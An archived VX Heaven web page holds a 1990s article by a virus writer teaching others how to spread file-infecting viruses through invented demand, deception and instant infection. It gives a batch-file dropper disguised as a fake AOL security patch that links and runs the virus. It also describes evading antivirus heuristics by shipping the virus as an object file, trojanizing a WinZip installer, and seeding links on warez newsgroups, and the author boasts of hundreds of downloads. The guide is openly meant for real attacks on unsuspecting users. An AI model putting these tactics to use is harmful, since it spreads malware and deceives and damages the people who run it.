<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> VicodinES 'Theory Of Better File Virus Distribution (a study in new ideas?)' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="VicodinES"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, VicodinES,Theory Of Better File Virus Distribution (a study in new ideas?), patch, demand, winzip, world, infect, command, setup, resident, memory, theory, rename, file, windows, infector, newsgroups"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"7c3e3faeab9e066e6b09b3e58e94a809d743a0a2-1498757278-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vve01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Theory Of Better File Virus Distribution (a study in new ideas?)</h1><p><a href="/lib/?lang=en&amp;author=VicodinES"> VicodinES</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vve01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vve01">Back to index</a>] [<a href="/lib/vve01.html#disqus_thread">Comments</a>]<br/> 
<p>Ok so you managed to get over your first hurdle, you managed to make/hack/remix a memory resident *.com file infecting virus. Congratulations! I mean that wholeheartedly. So now what? Did you spend all that time learning and debugging .asm files just so it would sit on your HD? No? I didn't think so. So what's your next move? DISTRIBUTION!</p>
<p>The first rule of distribution for a file infector is demand. You must create a demand or use a program that is in demand as a host. Without demand your file will never be downloaded or run. Second, deception! You must be able to get your virus past most AV products or you will never get a chance to infect. How is your code? Can you sneak by heuristics? You will need a way to sneak your virus passed the most common AV programs, even if you're heuristically challenged. Can that be done? Yes, a clever dropper can do that. How? .... read on. Third, infection! Infect on the first run! This also requires a decently clever dropper. What good is a memory resident *.com infecting virus if it's run and then no .com files are run the entire time it's resident. Then *poof* someone shuts off the computer and never runs your dropper again? That would be fine if you had written a multipartite virus but for this first example we are concentrating on a beginners virus, a basic *.com memory resident file infector.</p>
<p>Ok so I say that Virus Distribution consists of three basic components: DEMAND, DECEPTION and INFECTION. Am I right? Is this a sound theory? Well let me back up my theory with an example or two.</p>
<p>EXAMPLE #1:</p>
<p>The Virus: *.com memory resident file infector. (virus.com) Tools Needed: Tlink, Bat2exe, the virus.obj file (you can find Bat2exe from filez.com if you don't already have it and you must already have Tlink and the .obj file if you wrote the virus!)</p>
<p>Ok so you have everything you need and you're just dying to infect the world. Ok, give it some thought. Think "DEMAND." In this example we will capitalize on a current issue and create demand. In this case we dream up an "AOL IE 3.0 Security Patch" and our method of distribution will be AOL and USENET. You see, I have already done this. When AOL had their big crash I created an Anti-Crash "AOL Approved" Downloadable Patch. You say no one would ever fall for that :) .. yea right! So I just retooled that idea for "right now" - AOL only came out with a patch for their IE integrated browser on 7-7-97 :) .... Anticipate demand, create demand or capitalize on demand. Ok so now everyone who uses AOL will want to be secure, and you have made a program that is in demand. With demand out of the way we need to concentrate on deception. Now, most computer users are not that bright but they know better than to just run a .bat file - hell I have even heard that some computer users even know how to view .bat files and look for suspicious content! So we will hide our .bat file in a .com. (realistically though your chance won't drop that much if you just leave it as a .bat)</p>
<p>Ok lets make that dropper!</p>
<ul>
<li>Rename tlink.exe to patch.exe</li>
<li>Rename virus.obj to patch.obj</li>
<li>Create a nice descriptive .doc or readme.txt file to calm the user's nerves.</li>
<li>Create a .bat file that acts like your file description.</li>
</ul>
<pre class="source">
   aol_ie.bat : 
   cls 
   echo Press any key to update your Internet Explorer For America Online 
   pause>nul 
   patch /t patch.obj ;link the virus 
   patch ;run the virus 
   command ;call command.com for infection 

   bat2exe your aol_ie.bat - it will result in aol_ie.com [you can skip this part if you have to] 
   Package your files into a nice .zip or if you want you can use a self extracting compression program but use one with an icon!! (WinZip or RAR) [icons calm new 
   computer user's nerves!] 
</pre>
<p>So your zip will contain:</p>
<p>patch.exe [why did you rename tlink.exe? patch goes with the flow better than tlink.exe and will not arouse suspicion]</p>
<p>patch.obj [why did you rename virus.obj? also goes with the flow better]</p>
<p>aol_ie.com [the dropper .bat converted to .com]</p>
<p>readme.txt [be creative here!!]</p>
<p>*** [EXTRA] Take it a bit further! . If you want to you can add a few extra steps like creating a .pif for your .com [or .bat] or by including a hidden .ico or .dll file to go along with your .pif . use your imagination ***</p>
<p>*** [EXTRA] Take it a bit further! ... You can also fatten up your zip with miscellaneous files of varying size renamed to patch.dat or something equally innocuous ***</p>
<p>*** [Snag?] Did we hit a snag? . What if they view these files with a hex editor or text editor? No problem - all they will see is the inside of tlink.exe or some commands in aol_ie.com like patch and pause, certainly nothing to be alarmed about :) ***</p>
<p>So is the deception complete? More than you may realize. They downloaded your zip and scanned it. They did a deep or heuristic scan!!! Are you worried? Should you worry because your virus is heuristically challenged? Not really - you have a 75% better chance of beating heuristics in .obj form :) ... don't believe me? Test that one yourself. Also your aol_ie.com has the pause command in it. What virus pauses before it infects? Do you know of one? It doesn't make logical sense ... that's why we do it.</p>
<p>Finally, we need instant infection. Wait, that's already done. Did you catch it? The third to last line in our bat links the viral code and creates the actual virus. The second to last line runs our virus which, in turn goes memory resident. Then the last line of our very simple dropper runs command.com. We just went memory resident and then got command.com! Hell that means that even if our user has Win95 we still get a chance to go active every time they invoke a DOS Prompt or Shut Down To DOS. Also our heuristically challenged virus wasn't even created until after the download was scanned and no current AV programs (that I know of) support heuristics in their memory esident scanner!</p>
<p>So in example #1 I demonstrated how some thought and ingenuity combined with my theory of "Better Distribution" can increase your chances of infecting a new machine and spreading. Example #1 only deals with a very simple virus and limited targets (how many .com files can you find on your system?) ... but our mission was to increase the chances of infection and survival and we did that 10 fold!!</p>
<p>Ok, do you subscribe to my theory of Better Distribution yet? No? I'll try once again with a more complex virus and a totally different angle, but sticking to the main points of my theory : DEMAND, DECEPTION and INFECTION!</p>
<p>EXAMPLE #2:</p>
<p>The Virus: *.exe (Windows EXE) non-memory resident file infector. (virus.exe) Tools Needed: A current or new beta release of a popular Windows program.</p>
<p>Ok let's start! Mission number one? DEMAND! For this example let's use the latest greatest release of WinZip (beta or otherwise). That should take care of demand - everyone wants a new FREE version of WinZip. It's a good universal program to use just like pkzip was a few years ago.</p>
<p>As you just saw demand takes care of itself if you just put a little thought into it. Lets see if DECEPTION will do the same thing. How do you infect WinZip? Well, since this a more advanced example I will just assume that I don't have to show you how to infect a file. But, I will tell you to test your work! Think! The WinZip setup program is a lot more complex than any dropper .bat file we can construct so be sure to test your infection. For example I have done the WinZip thing and the Setup.exe for the 16bit WinZip has to have the exact same time/date stamp as the readme.txt. You may have made a successful infection but your deception will fail if the infected program screams that time/date stamps don't match! So with the more complex programs deception takes a bit more thought. Does the deception end here? No. How will you distribute this virus in a deceptive way? If you follow the normal route of distribution for a new virus that is attached to a new ware then you would just post the zip to alt.binaries.warez and all other warez-related newsgroups. Well, that's great but Dr Solly scans most binary newsgroups and posts virus alerts and instant fixes. So in one day you can be found, named and have a remover. That is the worst thing that could ever happen to a new virus! So what's there to do? Well either scam some warez web sites or warez traders into taking your file if it's legit (but infected) or do what I do/did and post to all those USENET warez related newsgroups with a LINK to some hacked out ftp or web site where the file is stored!! No one bothers to follow all warez links and scan them. Shit, I did this for one of my files and hid a counter on the site . it reached 553 before Geocities threw me off for distributing registered software. Now think about that - I took a new, not named and currently unscannable virus and had 500+ people seek it out (and run it?). For deceptive distribution that was a slam-dunk!</p>
<p>Ok now how did my INFECTION take care of itself? I chose a setup.exe!!! You have to choose your carriers wisely. A setup program usually runs all over and infects the program that it is setting up, in this case WinZip. Plus, WinZip is an often used program which greatly increases your chances of survival and any self extracting archives will be carriers or my virus!</p>
<p>Are you now convinced that my "Theory of Better Distribution" is the way to attack your next world wide virus infection? I hope so.</p>
<p>Boot sector virii don't have to rule the world of distribution (and the Wild List!) - think hard and you will figure out new and ingenious ways to make someone want your virus. I hope that I have made you think a bit harder about what you're going to do the next time that you decide to distribute one of your virii. Hopefully you will never again just upload some "new patch" for some obscure program to a local BBS and pray that your virus makes it around the world. If this was 1989 then you may have had a chance but remember that you have to think about now. Also, don't think you can just upload sex.exe to alt.binaries.erotica. Few people are stupid enough for run an .exe from a porn newsgroups (though I believe some are - just not enough of them to count).</p>
<p>Once again remember you have to think about now, don't take into account how they used to do it! Think about how you can do it now! How do you get files now? What programs do you want now? What makes you suspicious now?</p>
<p>Remember unless you still want to live that "I just write virii for research" lie then you need to think as hard about your distribution as you did on making your multipartite encrypted armored polymorphic stealth tunneling memory resident Windows 95 virus!!!</p>
<p>Peace, VicodinES</p>
<p>Ps. I also recommend you get the Nowhere Utilities by Nowhere Man! Fucking great tools for deception!</p>
[<a style="" href="/lib/?lang=EN&amp;index=VT#vve01">Back to index</a>] [<a href="/lib/vve01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vve01">de</a><a href="/lib/index.php?lang=en&amp;id=vve01">en</a><a href="/lib/index.php?lang=es&amp;id=vve01">es</a><a href="/lib/index.php?lang=it&amp;id=vve01">it</a><a href="/lib/index.php?lang=fr&amp;id=vve01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vve01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vve01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vve01">ua</a></div>
</body>
</html>
